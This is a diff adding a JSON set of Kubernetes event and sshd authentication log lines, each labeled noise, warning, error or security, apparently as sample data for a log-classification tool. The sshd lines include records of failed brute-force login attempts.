+    "raw_log": "k8s event: [Normal] reason=Scheduled component=kubelet msg=\"Successfully assigned default/sentria-test-badimage to sentria-cluster-control-plane\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulling component=kubelet msg=\"Pulling image \"nonexistent-registry.internal/fake-app:invalid\"\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Scheduled component=kubelet msg=\"Successfully assigned default/sentria-test-crash to sentria-cluster-control-plane\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulling component=kubelet msg=\"Pulling image \"busybox\"\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"registry.k8s.io/coredns/coredns:v1.14.2\" already present on machine and can be accessed by the pod\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Warning] reason=Unhealthy component=kubelet msg=\"Readiness probe failed: HTTP probe failed with statuscode: 503\"",
+    "category": "warning"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"registry.k8s.io/etcd:3.6.8-0\" already present on machine and can be accessed by the pod\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"docker.io/kindest/kindnetd:v20260528-9350166c\" already present on machine and can be accessed by the pod\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"registry.k8s.io/kube-apiserver:v1.36.1\" already present on machine and can be accessed by the pod\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"registry.k8s.io/kube-controller-manager:v1.36.1\" already present on machine and can be accessed by the pod\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=LeaderElection component=kube-controller-manager msg=\"sentria-cluster-control-plane_07e39f58-4420-4848-b20c-e9f5c6847105 became leader\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"registry.k8s.io/kube-proxy:v1.36.1\" already present on machine and can be accessed by the pod\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"registry.k8s.io/kube-scheduler:v1.36.1\" already present on machine and can be accessed by the pod\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=LeaderElection component=default-scheduler msg=\"sentria-cluster-control-plane_293e60f6-8409-4ec6-a0b9-2352775d1d5f became leader\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Normal] reason=Pulled component=kubelet msg=\"Container image \"docker.io/kindest/local-path-provisioner:v20260521-9fb22683\" already present on machine and can be accessed by the pod\"",
+    "category": "noise"
+  },
+  {
+    "system": "kubernetes",
+    "raw_log": "k8s event: [Warning] reason=BackOff component=kubelet msg=\"Back-off restarting failed container local-path-provisioner in pod local-path-provisioner-855c7b7774-wbj6b_local-path-storage(fd6328bf-2941-4296-8c41-55a19612fefa)\"",
+    "category": "error"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:55:46 srv-01 sshd[24200]: reverse mapping checking getaddrinfo for ns.malicious-domain.com [173.234.31.186] failed - POSSIBLE BREAK-IN ATTEMPT!",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:55:46 srv-01 sshd[24200]: Invalid user webmaster from 173.234.31.186 port 38926",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:55:46 srv-01 sshd[24200]: input_userauth_request: invalid user webmaster [preauth]",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:55:46 srv-01 sshd[24200]: pam_unix(sshd:auth): check pass; user unknown",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:55:46 srv-01 sshd[24200]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=173.234.31.186",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:55:48 srv-01 sshd[24200]: Failed password for invalid user webmaster from 173.234.31.186 port 38926 ssh2",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:55:48 srv-01 sshd[24200]: Disconnecting invalid user webmaster 173.234.31.186 port 38926: Too many authentication failures [preauth]",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:01:12 srv-01 sshd[24204]: Failed password for root from 218.92.0.15 port 48921 ssh2",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:01:14 srv-01 sshd[24204]: Failed password for invalid user test from 218.92.0.15 port 48921 ssh2",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:04:30 srv-01 sshd[24209]: Invalid user admin from 52.80.34.196 port 55102",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:04:32 srv-01 sshd[24209]: Failed password for invalid user admin from 52.80.34.196 port 55102 ssh2",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:09:15 srv-01 sshd[24215]: Disconnecting authenticating user root 185.156.73.41 port 41200: Change of username disallowed [preauth]",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:11:00 srv-01 sshd[24218]: error: kex_exchange_identification: banner line contains invalid characters from 194.26.29.112 port 39812",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:12:45 srv-01 sshd[24225]: userauth_pubkey: key type ssh-dss not in PubkeyAcceptedAlgorithms [preauth]",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:13:10 srv-01 sshd[24228]: error: maximum authentication attempts exceeded for invalid user oracle from 84.17.45.10 port 49120 ssh2 [preauth]",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:14:02 srv-01 sshd[24230]: fatal: userauth_pubkey: parse publickey packet: corrupted [preauth]",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:15:33 srv-01 sshd[24235]: Postponed keyboard-interactive for invalid user guest from 103.21.244.1 port 52100 ssh2 [preauth]",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:16:01 srv-01 sshd[24240]: pam_succeed_if(sshd:auth): requirement \"uid >= 1000\" not met by user \"daemon\"",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:17:15 srv-01 sshd[24245]: User root not allowed because not listed in AllowUsers",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:18:20 srv-01 sshd[24250]: User admin from 198.51.100.44 not allowed because not listed in AllowUsers",
+    "category": "security"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:55:48 srv-01 sshd[24200]: Connection closed by 173.234.31.186 port 38926 [preauth]",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:02:47 srv-01 sshd[24203]: Connection closed by 212.47.254.145 port 51200 [preauth]",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:05:00 srv-01 sshd[24210]: Did not receive identification string from 10.0.0.12 port 58912",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:08:22 srv-01 sshd[24214]: Connection reset by authenticating user root 45.142.214.12 port 50123 [preauth]",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:15:10 srv-01 sshd[24222]: Timeout before authentication for 103.152.220.10 port 44321",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:20:05 srv-01 sshd[24260]: Corrupted MAC on input. [preauth]",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:21:11 srv-01 sshd[24265]: WARNING: /etc/ssh/ssh_host_rsa_key is world readable!",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:22:30 srv-01 sshd[24270]: Permissions 0777 for '/etc/ssh/ssh_host_ecdsa_key' are too open.",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:23:45 srv-01 sshd[24275]: warning: /etc/hosts.allow, line 12: can't verify hostname: getaddrinfo(gw.corp.net) failed",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:24:12 srv-01 sshd[24280]: Bad protocol version identification 'SSH-1.0' from 61.177.173.12 port 38200",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:25:01 srv-01 sshd[24285]: kex_exchange_identification: client sent invalid protocol identifier \"\"",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:26:15 srv-01 sshd[24290]: client_loop: send disconnect: Broken pipe",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 07:27:00 srv-01 sshd[24295]: pam_warn(sshd:auth): function=[pam_sm_authenticate] flags=0 service=[sshd]",
+    "category": "warning"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:50:00 srv-01 sshd[24010]: error: Could not get shadow information for NOUSER",
+    "category": "error"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:50:01 srv-01 sshd[24011]: error: Bind to port 22 on 0.0.0.0 failed: Address already in use.",
+    "category": "error"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:50:01 srv-01 sshd[24011]: fatal: Cannot bind any address.",
+    "category": "error"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:50:02 srv-01 sshd[24012]: error: open /dev/null failed: Permission denied",
+    "category": "error"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:50:03 srv-01 sshd[24013]: fatal: sshd: no hostkeys available -- exiting.",
+    "category": "error"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:50:04 srv-01 sshd[24014]: error: PAM: Authentication failure for legal user testuser from 10.0.1.5",
+    "category": "error"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:50:05 srv-01 sshd[24015]: fatal: daemon() failed: No such file or directory",
+    "category": "error"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 06:50:06 srv-01 sshd[24016]: error: rexec of /usr/sbin/sshd failed: No such file or directory",
+    "category": "error"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 08:00:01 srv-01 sshd[25001]: Accepted publickey for deploy from 192.168.1.50 port 51234 ssh2: RSA SHA256:abc12345",
+    "category": "noise"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 08:00:01 srv-01 sshd[25001]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
+    "category": "noise"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 08:15:22 srv-01 sshd[25001]: Received disconnect from 192.168.1.50 port 51234:11: disconnected by user",
+    "category": "noise"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 08:15:22 srv-01 sshd[25001]: pam_unix(sshd:session): session closed for user deploy",
+    "category": "noise"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 09:00:00 srv-01 sshd[25050]: Accepted publickey for ubuntu from 192.168.1.55 port 58210 ssh2: ED25519 SHA256:xyz789",
+    "category": "noise"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 09:00:00 srv-01 sshd[25050]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)",
+    "category": "noise"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 09:30:10 srv-01 sshd[25050]: pam_unix(sshd:session): session closed for user ubuntu",
+    "category": "noise"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 09:35:00 srv-01 sshd[25060]: Server listening on 0.0.0.0 port 22.",
+    "category": "noise"
+  },
+  {
+    "system": "auth_ssh",
+    "raw_log": "Dec 10 09:35:00 srv-01 sshd[25060]: Server listening on :: port 22.",
+    "category": "noise"
+  }
+]
